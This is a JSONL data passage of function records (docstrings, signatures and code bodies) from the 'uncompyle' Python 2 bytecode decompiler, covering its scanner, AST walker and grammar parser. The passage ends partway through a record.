{"docstring": "\"\"\"Dump class definition, doc string and class body.\"\"\"\n\n", "func_signal": "def build_class(self, code):\n", "code": "assert type(code) == CodeType\ncode = Code(code, self.scanner, self.currentclass)\n#assert isinstance(code, Code)\n\nindent = self.indent\n#self.print_(indent, '#flags:\\t', int(code.co_flags))\nast = self.build_ast(code._tokens, code._customize)\ncode._tokens = None # save memory\nassert ast == 'stmts'\n\nif ast[0][0] == NAME_MODULE:\n    del ast[0]\n\n# if docstring exists, dump it\nif code.co_consts and code.co_consts[0] != None and ast[0][0] == ASSIGN_DOC_STRING(code.co_consts[0]):\n    self.print_docstring(indent, code.co_consts[0])\n    self.print_()\n    del ast[0]\n\n\n# the function defining a class normally returns locals(); we\n# don't want this to show up in the source, thus remove the node\nif ast[-1][0] == RETURN_LOCALS:\n    del ast[-1] # remove last node\n#else:\n#    print ast[-1][-1]\n\nfor g in find_globals(ast, set()):\n   self.print_(indent, 'global ', g)\n   \nself.gen_source(ast, code._customize)\ncode._tokens = None; code._customize = None # save memory", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nprettyprint a list or tuple\n\"\"\"\n", "func_signal": "def n_build_list(self, node):\n", "code": "p = self.prec\nself.prec = 100\nlastnode = node.pop()\nlastnodetype = lastnode.type\nif lastnodetype.startswith('BUILD_LIST'):\n    self.write('['); endchar = ']'\nelif lastnodetype.startswith('BUILD_TUPLE'):\n    self.write('('); endchar = ')'\nelif lastnodetype.startswith('BUILD_SET'):\n    self.write('{'); endchar = '}'\nelif lastnodetype.startswith('ROT_TWO'):\n    self.write('('); endchar = ')'\nelse:\n    raise 'Internal Error: n_build_list expects list or tuple'\n\nflat_elems = []\nfor elem in node:\n    if elem == 'expr1024':\n        for subelem in elem:\n                for subsubelem in subelem:\n                    flat_elems.append(subsubelem)\n    elif elem == 'expr32':\n        for subelem in elem:\n            flat_elems.append(subelem)\n    else:\n        flat_elems.append(elem)\n    \nself.indentMore(INDENT_PER_LEVEL)\nif lastnode.attr > 3:\n    line_separator = ',\\n' + self.indent\nelse:\n    line_separator = ', '\nsep = INDENT_PER_LEVEL[:-1]\n\nfor elem in flat_elems:\n    if elem == 'ROT_THREE':\n        continue\n    assert elem == 'expr'\n    value = self.traverse(elem)\n    self.write(sep, value)\n    sep = line_separator\nif lastnode.attr == 1 and lastnodetype.startswith('BUILD_TUPLE'):\n    self.write(',')\nself.write(endchar)\nself.indentLess(INDENT_PER_LEVEL)\nself.prec = p\nself.prune()", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nexec_stmt ::= expr exprlist DUP_TOP EXEC_STMT\nexec_stmt ::= expr exprlist EXEC_STMT\n\"\"\"\n", "func_signal": "def n_exec_stmt(self, node):\n", "code": "self.write(self.indent, 'exec ')\nself.preorder(node[0])\nif node[1][0] != NONE:\n    sep = ' in '\n    for subnode in node[1]:\n        self.write(sep); sep = \", \"\n        self.preorder(subnode)\nself.print_()\nself.prune() # stop recursing", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"Restrict pos to parent boundaries.\"\"\"\n", "func_signal": "def restrict_to_parent(self, target, parent):\n", "code": "if not (parent['start'] < target < parent['end']):\n    target = parent['end']\nreturn target", "path": "uncompyle\\Scanner.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nIf the name of the formal parameter starts with dot,\nit's a tuple parameter, like this:\n#          def MyFunc(xx, (a,b,c), yy):\n#                  print a, b*2, c*42\nIn byte-code, the whole tuple is assigned to parameter '.1' and\nthen the tuple gets unpacked to 'a', 'b' and 'c'.\n\nSince identifiers starting with a dot are illegal in Python,\nwe can search for the byte-code equivalent to '(a,b,c) = .1'\n\"\"\"\n\n", "func_signal": "def get_tuple_parameter(self, ast, name):\n", "code": "assert ast == 'stmts'\nfor i in range(len(ast)):\n    # search for an assign-statement\n    assert ast[i][0] == 'stmt'\n    node = ast[i][0][0]\n    if node == 'assign' \\\n       and node[0] == ASSIGN_TUPLE_PARAM(name):\n        # okay, this assigns '.n' to something\n        del ast[i]\n        # walk lhs; this\n        # returns a tuple of identifiers as used\n        # within the function definition\n        assert node[1] == 'designator'\n        # if lhs is not a UNPACK_TUPLE (or equiv.),\n        # add parenteses to make this a tuple\n        #if node[1][0] not in ('unpack', 'unpack_list'):\n        return '(' + self.traverse(node[1]) + ')'\n        #return self.traverse(node[1])\nraise \"Can't find tuple parameter\" % name", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "#\n#  Special handling for opcodes that take a variable number\n#  of arguments -- we add a new rule for each:\n#\n#    expr ::= {expr}^n BUILD_LIST_n\n#    expr ::= {expr}^n BUILD_TUPLE_n\n#    unpack_list ::= UNPACK_LIST {expr}^n\n#    unpack ::= UNPACK_TUPLE {expr}^n\n#    unpack ::= UNPACK_SEQEUENE {expr}^n\n#    mkfunc ::= {expr}^n LOAD_CONST MAKE_FUNCTION_n\n#    mkfunc ::= {expr}^n load_closure LOAD_CONST MAKE_FUNCTION_n\n#    expr ::= expr {expr}^n CALL_FUNCTION_n\n#    expr ::= expr {expr}^n CALL_FUNCTION_VAR_n POP_TOP\n#    expr ::= expr {expr}^n CALL_FUNCTION_VAR_KW_n POP_TOP\n#    expr ::= expr {expr}^n CALL_FUNCTION_KW_n POP_TOP\n#\n", "func_signal": "def parse(tokens, customize):\n", "code": "global p\nfor k, v in customize.items():\n    # avoid adding the same rule twice to this parser\n    if p.customized.has_key(k):\n        continue\n    p.customized[k] = None\n\n    #nop = lambda self, args: None\n    op = k[:string.rfind(k, '_')]\n    if op in ('BUILD_LIST', 'BUILD_TUPLE', 'BUILD_SET'):\n        rule = 'build_list ::= ' + 'expr1024 '*(v/1024) + 'expr32 '*((v/32)%32) + 'expr '*(v%32) + k\n    elif op in ('UNPACK_TUPLE', 'UNPACK_SEQUENCE'):\n        rule = 'unpack ::= ' + k + ' designator'*v\n    elif op == 'UNPACK_LIST':\n        rule = 'unpack_list ::= ' + k + ' designator'*v\n    elif op in ('DUP_TOPX', 'RAISE_VARARGS'):\n        # no need to add a rule\n        continue\n        #rule = 'dup_topx ::= ' + 'expr '*v + k\n    elif op == 'MAKE_FUNCTION':\n        p.addRule('mklambda ::= %s LOAD_LAMBDA %s' %\n              ('expr '*v, k), nop)\n        rule = 'mkfunc ::= %s LOAD_CONST %s' % ('expr '*v, k)\n    elif op == 'MAKE_CLOSURE':\n        p.addRule('mklambda ::= %s load_closure LOAD_LAMBDA %s' %\n              ('expr '*v, k), nop)\n        p.addRule('genexpr ::= %s load_closure LOAD_GENEXPR %s expr GET_ITER CALL_FUNCTION_1' %\n              ('expr '*v, k), nop)\n        p.addRule('setcomp ::= %s load_closure LOAD_SETCOMP %s expr GET_ITER CALL_FUNCTION_1' %\n              ('expr '*v, k), nop)\n        p.addRule('dictcomp ::= %s load_closure LOAD_DICTCOMP %s expr GET_ITER CALL_FUNCTION_1' %\n              ('expr '*v, k), nop)\n        rule = 'mkfunc ::= %s load_closure LOAD_CONST %s' % ('expr '*v, k)", "path": "uncompyle\\Parser.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nRemove recursive references to allow garbage\ncollector to collect this object.\n\"\"\"\n", "func_signal": "def cleanup(self):\n", "code": "for dict in (self.rule2func, self.rules, self.rule2name):\n    for i in dict.keys():\n        dict[i] = None\nfor i in dir(self):\n    setattr(self, i, None)", "path": "uncompyle\\Parser.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\ndecompile Python byte-code file (.pyc)\n\"\"\"\n", "func_signal": "def uncompyle_file(filename, outstream=None, showasm=0, showast=0, deob=0):\n", "code": "version, co = _load_module(filename)\nuncompyle(version, co, outstream, showasm, showast, deob)\nco = None", "path": "uncompyle\\__init__.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nReturn the next jump that was generated by an except SomeException:\nconstruct in a try...except...else clause or None if not found.\n\"\"\"\n\n", "func_signal": "def next_except_jump(self, start):\n", "code": "if self.code[start] == DUP_TOP:        \n    except_match = self.first_instr(start, len(self.code), POP_JUMP_IF_FALSE)\n    if except_match:\n        jmp = self.prev[self.get_target(except_match)]\n        self.ignore_if.add(except_match)\n        self.not_continue.add(jmp)\n        return jmp\n    \ncount_END_FINALLY = 0\ncount_SETUP_ = 0\nfor i in self.op_range(start, len(self.code)):\n    op = self.code[i]\n    if op == END_FINALLY:\n        if count_END_FINALLY == count_SETUP_:\n            assert self.code[self.prev[i]] in (JA, JF, RETURN_VALUE)\n            self.not_continue.add(self.prev[i])\n            return self.prev[i]\n        count_END_FINALLY += 1\n    elif op in (SETUP_EXCEPT, SETUP_WITH, SETUP_FINALLY):\n        count_SETUP_ += 1", "path": "uncompyle\\Scanner.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "'''\nexpr ::= _mklambda\nexpr ::= SET_LINENO\nexpr ::= LOAD_FAST\nexpr ::= LOAD_NAME\nexpr ::= LOAD_CONST\nexpr ::= LOAD_GLOBAL\nexpr ::= LOAD_DEREF\nexpr ::= LOAD_LOCALS\nexpr ::= load_attr\nexpr ::= binary_expr\nexpr ::= binary_expr_na\nexpr ::= build_list\nexpr ::= cmp\nexpr ::= mapexpr\nexpr ::= and\nexpr ::= and2\nexpr ::= or\nexpr ::= unary_expr\nexpr ::= call_function\nexpr ::= unary_not\nexpr ::= unary_convert\nexpr ::= binary_subscr\nexpr ::= binary_subscr2\nexpr ::= load_attr\nexpr ::= get_iter\nexpr ::= slice0\nexpr ::= slice1\nexpr ::= slice2\nexpr ::= slice3\nexpr ::= buildslice2\nexpr ::= buildslice3\nexpr ::= yield\n\n\n\nbinary_expr ::= expr expr binary_op\nbinary_op ::= BINARY_ADD\nbinary_op ::= BINARY_MULTIPLY\nbinary_op ::= BINARY_AND\nbinary_op ::= BINARY_OR\nbinary_op ::= BINARY_XOR\nbinary_op ::= BINARY_SUBTRACT\nbinary_op ::= BINARY_DIVIDE\nbinary_op ::= BINARY_TRUE_DIVIDE\nbinary_op ::= BINARY_FLOOR_DIVIDE\nbinary_op ::= BINARY_MODULO\nbinary_op ::= BINARY_LSHIFT\nbinary_op ::= BINARY_RSHIFT\nbinary_op ::= BINARY_POWER\n\nunary_expr ::= expr unary_op\nunary_op ::= UNARY_POSITIVE\nunary_op ::= UNARY_NEGATIVE\nunary_op ::= UNARY_INVERT\n\nunary_not ::= expr UNARY_NOT\nunary_convert ::= expr UNARY_CONVERT\n\nbinary_subscr ::= expr expr BINARY_SUBSCR\nbinary_subscr2 ::= expr expr DUP_TOPX_2 BINARY_SUBSCR\n\nload_attr ::= expr LOAD_ATTR\nget_iter ::= expr GET_ITER\nslice0 ::= expr SLICE+0\nslice0 ::= expr DUP_TOP SLICE+0\nslice1 ::= expr expr SLICE+1\nslice1 ::= expr expr DUP_TOPX_2 SLICE+1\nslice2 ::= expr expr SLICE+2\nslice2 ::= expr expr DUP_TOPX_2 SLICE+2\nslice3 ::= expr expr expr SLICE+3\nslice3 ::= expr expr expr DUP_TOPX_3 SLICE+3\nbuildslice3 ::= expr expr expr BUILD_SLICE_3\nbuildslice2 ::= expr expr BUILD_SLICE_2\n\nyield ::= expr YIELD_VALUE\n\n_mklambda ::= load_closure mklambda\n_mklambda ::= mklambda\n\nor   ::= expr POP_JUMP_IF_TRUE expr COME_FROM\nor   ::= expr JUMP_IF_TRUE_OR_POP expr COME_FROM\nand  ::= expr POP_JUMP_IF_FALSE expr COME_FROM\nand  ::= expr JUMP_IF_FALSE_OR_POP expr COME_FROM\nand2 ::= _jump POP_JUMP_IF_FALSE COME_FROM expr COME_FROM\n\nexpr ::= conditional\nconditional ::= expr POP_JUMP_IF_FALSE expr JUMP_FORWARD expr COME_FROM\nconditional ::= expr POP_JUMP_IF_FALSE expr JUMP_ABSOLUTE expr\nexpr ::= conditionalnot\nconditionalnot ::= expr POP_JUMP_IF_TRUE expr JUMP_FORWARD expr COME_FROM\nconditionalnot ::= expr POP_JUMP_IF_TRUE expr JUMP_ABSOLUTE expr \n\nret_expr ::= expr\nret_expr ::= ret_and\nret_expr ::= ret_or\n\nret_expr_or_cond ::= ret_expr\nret_expr_or_cond ::= ret_cond\nret_expr_or_cond ::= ret_cond_not\n\nret_and  ::= expr JUMP_IF_FALSE_OR_POP ret_expr_or_cond COME_FROM\nret_or   ::= expr JUMP_IF_TRUE_OR_POP ret_expr_or_cond COME_FROM\nret_cond ::= expr POP_JUMP_IF_FALSE expr RETURN_END_IF ret_expr_or_cond\nret_cond_not ::= expr POP_JUMP_IF_TRUE expr RETURN_END_IF ret_expr_or_cond\n\nstmt ::= return_lambda\nstmt ::= conditional_lambda\n\nreturn_lambda ::= ret_expr RETURN_VALUE LAMBDA_MARKER\nconditional_lambda ::= expr POP_JUMP_IF_FALSE return_if_stmt return_stmt LAMBDA_MARKER \n\ncmp ::= cmp_list\ncmp ::= compare\ncompare ::= expr expr COMPARE_OP\ncmp_list ::= expr cmp_list1 ROT_TWO POP_TOP\n        _come_from\ncmp_list1 ::= expr DUP_TOP ROT_THREE\n        COMPARE_OP JUMP_IF_FALSE_OR_POP\n        cmp_list1 COME_FROM\ncmp_list1 ::= expr DUP_TOP ROT_THREE\n        COMPARE_OP JUMP_IF_FALSE_OR_POP\n        cmp_list2 COME_FROM\ncmp_list2 ::= expr COMPARE_OP JUMP_FORWARD\ncmp_list2 ::= expr COMPARE_OP RETURN_VALUE\nmapexpr ::= BUILD_MAP kvlist\n\nkvlist ::= kvlist kv\nkvlist ::= kvlist kv2\nkvlist ::= kvlist kv3\nkvlist ::=\n\nkv ::= DUP_TOP expr ROT_TWO expr STORE_SUBSCR\nkv2 ::= DUP_TOP expr expr ROT_THREE STORE_SUBSCR\nkv3 ::= expr expr STORE_MAP\n\nexprlist ::= exprlist expr\nexprlist ::= expr\n\nnullexprlist ::=\n\nexpr32 ::= expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr expr  \nexpr1024 ::= expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 expr32 \n'''\n\n", "func_signal": "def p_expr(self, args):\n", "code": "\ncollect = ('stmts', 'exprlist', 'kvlist', '_stmts', 'print_items')\n\nif nt in collect and len(args) > 1:\n    #\n    #  Collect iterated thingies together.\n    #\n    rv = args[0]\n    rv.append(args[1])\nelse:\n   rv = GenericASTBuilder.nonterminal(self, nt, args)\nreturn rv", "path": "uncompyle\\Parser.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "#\n#  Call *only* when the entire state machine has been built!\n#  It relies on self.edges being filled in completely, and\n#  then duplicates and inlines code to boost speed at the\n#  cost of extreme ugliness.\n#\n", "func_signal": "def makeSet_fast(self, token, sets, i):\n", "code": "cur, next = sets[i], sets[i+1]\nttype = token is not None and self.typestring(token) or None\n\nfor item in cur:\n    ptr = (item, i)\n    state, parent = item\n    if ttype is not None:\n        k = self.edges.get((state, ttype), None)\n        if k is not None:\n            #self.add(next, (k, parent), i+1, ptr)\n            #INLINED --v\n            new = (k, parent)\n            key = (new, i+1)\n            if new not in next:\n                self.links[key] = []\n                next.append(new)\n            self.links[key].append((ptr, None))\n            #INLINED --^\n            #nk = self.goto(k, None)\n            nk = self.edges.get((k, None), None)\n            if nk is not None:\n                #self.add(next, (nk, i+1))\n                #INLINED --v\n                new = (nk, i+1)\n                if new not in next:\n                    next.append(new)\n                #INLINED --^\n    else:\n        add = self.gotoST(state, token)\n        for k in add:\n            if k is not None:\n                self.add(next, (k, parent), i+1, ptr)\n                #nk = self.goto(k, None)\n                nk = self.edges.get((k, None), None)\n                if nk is not None:\n                    self.add(next, (nk, i+1))\n\n    if parent == i:\n        continue\n\n    for rule in self.states[state].complete:\n        lhs, rhs = rule\n        for pitem in sets[parent]:\n            pstate, pparent = pitem\n            #k = self.goto(pstate, lhs)\n            k = self.edges.get((pstate, lhs), None)\n            if k is not None:\n                why = (item, i, rule)\n                pptr = (pitem, parent)\n                #self.add(cur, (k, pparent),\n                #\t i, pptr, why)\n                #INLINED --v\n                new = (k, pparent)\n                key = (new, i)\n                if new not in cur:\n                    self.links[key] = []\n                    cur.append(new)\n                self.links[key].append((pptr, why))\n                #INLINED --^\n                #nk = self.goto(k, None)\n                nk = self.edges.get((k, None), None)\n                if nk is not None:\n                    #self.add(cur, (nk, i))\n                    #INLINED --v\n                    new = (nk, i)\n                    if new not in cur:\n                        cur.append(new)\n                    #INLINED --^", "path": "uncompyle\\spark.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"Find globals in this statement.\"\"\"\n", "func_signal": "def find_globals(node, globs):\n", "code": "for n in node:\n    if isinstance(n, AST):\n        globs = find_globals(n, globs)\n    elif n.type in ('STORE_GLOBAL', 'DELETE_GLOBAL'):\n        globs.add(n.pattr)\nreturn globs", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nFind the first <instr> in the block from start to end.\n<instr> is any python bytecode instruction or a list of opcodes\nIf <instr> is an opcode with a target (like a jump), a target\ndestination can be specified which must match precisely if exact\nis True, or if exact is False, the instruction which has a target\nclosest to <target> will be returned.\n\nReturn index to it or None if not found.\n\"\"\"\n", "func_signal": "def first_instr(self, start, end, instr, target=None, exact=True):\n", "code": "code = self.code\nassert(start>=0 and end<=len(code))\n\ntry:    None in instr\nexcept: instr = [instr]\n\npos = None\ndistance = len(code)\nfor i in self.op_range(start, end):\n    op = code[i]\n    if op in instr:\n        if target is None:\n            return i\n        dest = self.get_target(i, op)\n        if dest == target:\n            return i\n        elif not exact:\n            _distance = abs(target - dest)\n            if _distance < distance:\n                distance = _distance\n                pos = i\nreturn pos", "path": "uncompyle\\Scanner.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nDetect structures and their boundaries to fix optimizied jumps\nin python2.3+\n\"\"\"\n\n# TODO: check the struct boundaries more precisely -Dan\n\n", "func_signal": "def detect_structure(self, pos, op=None):\n", "code": "code = self.code\n# Ev remove this test and make op a mandatory argument -Dan\nif op is None:\n    op = code[pos]\n\n## Detect parent structure\nparent = self.structs[0]\nstart  = parent['start']\nend    = parent['end']\nfor s in self.structs:\n    _start = s['start']\n    _end   = s['end']\n    if (_start <= pos < _end) and (_start >= start and _end <= end):\n        start  = _start\n        end    = _end\n        parent = s\n\n## We need to know how many new structures were added in this run\norigStructCount = len(self.structs)\n\nif op == SETUP_LOOP:\n    #import pdb; pdb.set_trace()\n    start = pos+3\n    target = self.get_target(pos, op)\n    end    = self.restrict_to_parent(target, parent)\n    if target != end:\n        self.fixed_jumps[pos] = end\n    \n    (line_no, next_line_byte) = self.lines[pos]\n    jump_back = self.last_instr(start, end, JA,\n                                  next_line_byte, False)\n                                  \n    if jump_back and jump_back != self.prev[end] and code[jump_back+3] in (JA, JF):\n        if code[self.prev[end]] == RETURN_VALUE or \\\n              (code[self.prev[end]] == POP_BLOCK and code[self.prev[self.prev[end]]] == RETURN_VALUE):\n            jump_back = None\n            \n    if not jump_back: # loop suite ends in return. wtf right?\n        jump_back = self.last_instr(start, end, RETURN_VALUE) + 1\n        if not jump_back:               \n            return\n        if code[self.prev[next_line_byte]] not in (PJIF, PJIT):\n            loop_type = 'for'\n        else:\n            loop_type = 'while'\n            self.ignore_if.add(self.prev[next_line_byte])\n        target = next_line_byte\n        end = jump_back + 3\n    else:\n        if self.get_target(jump_back) >= next_line_byte:\n            jump_back = self.last_instr(start, end, JA,\n                                      start, False)\n            \n        if end > jump_back+4 and code[end] in (JF, JA):\n            if code[jump_back+4] in (JA, JF):\n                if self.get_target(jump_back+4) == self.get_target(end):\n                    self.fixed_jumps[pos] = jump_back+4\n                    end = jump_back+4\n        elif target < pos:\n            self.fixed_jumps[pos] = jump_back+4\n            end = jump_back+4\n         \n        target = self.get_target(jump_back, JA)\n\n        if code[target] in (FOR_ITER, GET_ITER):\n            loop_type = 'for'\n        else:\n            loop_type = 'while'\n            test = self.prev[next_line_byte]\n            if test == pos:\n                loop_type = 'while 1'\n            else:\n                self.ignore_if.add(test)\n                test_target = self.get_target(test)\n                if test_target > (jump_back+3):\n                    jump_back = test_target\n            \n        self.not_continue.add(jump_back)\n         \n    self.loops.append(target)\n    self.structs.append({'type': loop_type + '-loop',\n                           'start': target,\n                           'end':   jump_back})\n    if jump_back+3 != end:\n        self.structs.append({'type': loop_type + '-else',\n                               'start': jump_back+3,\n                               'end':   end})\nelif op == SETUP_EXCEPT:\n    start  = pos+3\n    target = self.get_target(pos, op)\n    end    = self.restrict_to_parent(target, parent)\n    if target != end:\n        self.fixed_jumps[pos] = end\n        #print target, end, parent\n    ## Add the try block\n    self.structs.append({'type':  'try',\n                           'start': start,\n                           'end':   end-4})\n    ## Now isolate the except and else blocks\n    end_else = start_else = self.get_target(self.prev[end])\n\n    ## Add the except blocks\n    i = end\n    while self.code[i] != END_FINALLY:\n        jmp = self.next_except_jump(i)\n        if self.code[jmp] == RETURN_VALUE:\n            self.structs.append({'type':  'except',\n                                   'start': i,\n                                   'end':   jmp+1})\n            i = jmp + 1\n        else:\n            if self.get_target(jmp) != start_else:\n                end_else = self.get_target(jmp)\n            if self.code[jmp] == JF:\n                self.fixed_jumps[jmp] = -1\n            self.structs.append({'type':  'except',\n                           'start': i,\n                           'end':   jmp})\n            i = jmp + 3   \n\n    ## Add the try-else block\n    if end_else != start_else:\n        r_end_else = self.restrict_to_parent(end_else, parent)\n        self.structs.append({'type':  'try-else',\n                               'start': i+1,\n                               'end':   r_end_else})\n        self.fixed_jumps[i] = r_end_else\n    else:\n        self.fixed_jumps[i] = i+1\n    \n\nelif op in (PJIF, PJIT):\n    start = pos+3 \n    target = self.get_target(pos, op)\n    rtarget = self.restrict_to_parent(target, parent)\n    pre = self.prev\n    \n    if target != rtarget and parent['type'] == 'and/or':\n        self.fixed_jumps[pos] = rtarget\n        return\n    #does this jump to right after another cond jump?\n    # if so, it's part of a larger conditional\n    if (code[pre[target]] in (JUMP_IF_FALSE_OR_POP, JUMP_IF_TRUE_OR_POP,\n            PJIF, PJIT)) and (target > pos):  \n        self.fixed_jumps[pos] = pre[target]\n        self.structs.append({'type':  'and/or',\n                               'start': start,\n                               'end':   pre[target]})\n        return\n               \n    # is this an if and\n    if op == PJIF:\n        match = self.rem_or(start, self.next_stmt[pos], PJIF, target)\n        match = self.remove_mid_line_ifs(match)\n        if match:\n            if code[pre[rtarget]] in (JF, JA) \\\n                    and pre[rtarget] not in self.stmts \\\n                    and self.restrict_to_parent(self.get_target(pre[rtarget]), parent) == rtarget:\n                if code[pre[pre[rtarget]]] == JA \\\n                        and self.remove_mid_line_ifs([pos]) \\\n                        and target == self.get_target(pre[pre[rtarget]]) \\\n                        and (pre[pre[rtarget]] not in self.stmts or self.get_target(pre[pre[rtarget]]) > pre[pre[rtarget]])\\\n                        and 1 == len(self.remove_mid_line_ifs(self.rem_or(start, pre[pre[rtarget]], (PJIF, PJIT), target))):\n                    pass\n                elif code[pre[pre[rtarget]]] == RETURN_VALUE \\\n                        and self.remove_mid_line_ifs([pos]) \\\n                        and 1 == (len(set(self.remove_mid_line_ifs(self.rem_or(start, pre[pre[rtarget]], \\\n                                                     (PJIF, PJIT), target))) \\\n                                      | set(self.remove_mid_line_ifs(self.rem_or(start, pre[pre[rtarget]], \\\n                                                   (PJIF, PJIT, JA), pre[rtarget], True))))):\n                    pass\n                else:\n                    fix = None\n                    jump_ifs = self.all_instr(start, self.next_stmt[pos], PJIF)\n                    last_jump_good = True\n                    for j in jump_ifs:\n                        if target == self.get_target(j):\n                            if self.lines[j].next == j+3 and last_jump_good:\n                                fix = j\n                                break\n                        else:\n                            last_jump_good = False\n                    self.fixed_jumps[pos] = fix or match[-1]\n                    return\n            else:\n                self.fixed_jumps[pos] = match[-1]\n                return\n    else: # op == PJIT\n        if (pos+3) in self.load_asserts:\n            if code[pre[rtarget]] == RAISE_VARARGS:\n                return\n            self.load_asserts.remove(pos+3)\n            \n        next = self.next_stmt[pos]\n        if pre[next] == pos:\n            pass\n        elif code[next] in (JF, JA) and target == self.get_target(next):\n            if code[pre[next]] == PJIF:\n                if code[next] == JF or target != rtarget or code[pre[pre[rtarget]]] not in (JA, RETURN_VALUE):\n                    self.fixed_jumps[pos] = pre[next]\n                    return\n        elif code[next] == JA and code[target] in (JA, JF):\n            next_target = self.get_target(next)\n            if self.get_target(target) == next_target:\n                self.fixed_jumps[pos] = pre[next]\n                return\n            elif code[next_target] in (JA, JF) and self.get_target(next_target) == self.get_target(target):\n                self.fixed_jumps[pos] = pre[next]\n                return\n            \n    \n    #don't add a struct for a while test, it's already taken care of\n    if pos in self.ignore_if:\n        return\n        \n    if code[pre[rtarget]] == JA and pre[rtarget] in self.stmts \\\n            and pre[rtarget] != pos and pre[pre[rtarget]] != pos:\n        if code[rtarget] == JA and code[rtarget+3] == POP_BLOCK:\n            if code[pre[pre[rtarget]]] != JA:\n                pass\n            elif self.get_target(pre[pre[rtarget]]) != target:\n                pass\n            else:\n                rtarget = pre[rtarget]\n        else:\n            rtarget = pre[rtarget]\n                \n    #does the if jump just beyond a jump op, then this is probably an if statement\n    if code[pre[rtarget]] in (JA, JF):\n        if_end = self.get_target(pre[rtarget])\n        \n        #is this a loop not an if?\n        if (if_end < pre[rtarget]) and (code[pre[if_end]] == SETUP_LOOP):\n            if(if_end > start):\n                return\n                \n        end = self.restrict_to_parent(if_end, parent)\n                                               \n        self.structs.append({'type':  'if-then',\n                               'start': start,\n                               'end':   pre[rtarget]})\n        self.not_continue.add(pre[rtarget])\n        \n        if rtarget < end:\n            self.structs.append({'type':  'if-else',\n                               'start': rtarget,\n                               'end':   end})\n    elif code[pre[rtarget]] == RETURN_VALUE:\n        self.structs.append({'type':  'if-then',\n                               'start': start,\n                               'end':   rtarget})\n        self.return_end_ifs.add(pre[rtarget])\n\nelif op in (JUMP_IF_FALSE_OR_POP, JUMP_IF_TRUE_OR_POP):\n    target = self.get_target(pos, op)", "path": "uncompyle\\Scanner.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nFind the last <instr> in the block from start to end.\n<instr> is any python bytecode instruction or a list of opcodes\nIf <instr> is an opcode with a target (like a jump), a target\ndestination can be specified which must match precisely if exact\nis True, or if exact is False, the instruction which has a target\nclosest to <target> will be returned.\n\nReturn index to it or None if not found.\n\"\"\"\n\n", "func_signal": "def last_instr(self, start, end, instr, target=None, exact=True):\n", "code": "code = self.code\nif not (start>=0 and end<=len(code)):\n    return None\n\ntry:    None in instr\nexcept: instr = [instr]\n\npos = None\ndistance = len(code)\nfor i in self.op_range(start, end):\n    op = code[i]\n    if op in instr:\n        if target is None:\n            pos = i\n        else:\n            dest = self.get_target(i, op)\n            if dest == target:\n                distance = 0\n                pos = i\n            elif not exact:\n                _distance = abs(target - dest)\n                if _distance <= distance:\n                    distance = _distance\n                    pos = i\nreturn pos", "path": "uncompyle\\Scanner.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"Find globals in this statement.\"\"\"\n", "func_signal": "def find_all_globals(node, globs):\n", "code": "for n in node:\n    if isinstance(n, AST):\n        globs = find_all_globals(n, globs)\n    elif n.type in ('STORE_GLOBAL', 'DELETE_GLOBAL', 'LOAD_GLOBAL'):\n        globs.add(n.pattr)\nreturn globs", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nDetect all offsets in a byte code which are jump targets.\n\nReturn the list of offsets.\n\nThis procedure is modelled after dis.findlables(), but here\nfor each target the number of jumps are counted.\n\"\"\"\n\n", "func_signal": "def find_jump_targets(self, code):\n", "code": "hasjrel = dis.hasjrel\nhasjabs = dis.hasjabs\n\nn = len(code)\nself.structs = [{'type':  'root',\n                   'start': 0,\n                   'end':   n-1}]\nself.loops = []  ## All loop entry points\nself.fixed_jumps = {} ## Map fixed jumps to their real destination\nself.ignore_if = set()\nself.build_stmt_indices()\nself.not_continue = set()\nself.return_end_ifs = set()\n\ntargets = {}\nfor i in self.op_range(0, n):\n    op = code[i]\n\n    ## Determine structures and fix jumps for 2.3+\n    self.detect_structure(i, op)\n\n    if op >= HAVE_ARGUMENT:\n        label = self.fixed_jumps.get(i)\n        oparg = code[i+1] + code[i+2] * 256\n            \n        \n        if label is None:\n            if op in hasjrel and op != FOR_ITER:\n                label = i + 3 + oparg\n            elif op in hasjabs:\n                if op in (JUMP_IF_FALSE_OR_POP, JUMP_IF_TRUE_OR_POP):\n                    if (oparg > i):\n                        label = oparg\n               \n        if label is not None and label != -1:\n            targets[label] = targets.get(label, []) + [i]\n    elif op == END_FINALLY and i in self.fixed_jumps:\n        label = 